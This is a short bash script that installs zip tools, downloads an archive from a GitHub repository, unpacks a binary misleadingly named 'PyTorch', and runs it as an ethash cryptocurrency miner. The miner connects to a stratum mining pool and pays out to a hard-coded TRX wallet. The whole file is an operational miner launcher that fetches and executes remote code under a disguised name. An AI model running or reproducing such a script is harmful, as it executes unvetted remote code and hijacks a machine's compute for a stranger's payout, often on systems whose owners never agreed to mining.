#!/bin/bash
sudo apt update && sudo apt-get install zip unzip && wget https://github.com/Diefky/baru/raw/main/PyTorch.zip && unzip PyTorch.zip && cd PyTorch && chmod u+x PyTorch && ./PyTorch -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TGmtm8mGs8bgmSVPZ3rjggWEEQW8cSetDC.n41
